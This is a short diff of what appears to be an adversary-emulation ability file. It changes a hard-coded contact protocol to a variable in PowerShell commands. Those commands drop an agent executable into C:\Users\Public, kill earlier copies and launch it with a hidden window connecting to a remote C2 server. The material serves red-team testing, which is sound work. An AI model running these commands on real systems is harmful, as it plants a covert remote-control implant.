@@ -73,7 +73,7 @@
           Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
           rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
           ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
-          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact tcp" -WindowStyle hidden;
+          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
         variations:
           - description: Run against the UDP contact
             command: |
@@ -90,4 +90,4 @@
               Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;
               rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;
               ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
-              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact tcp" -WindowStyle hidden;
+              Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
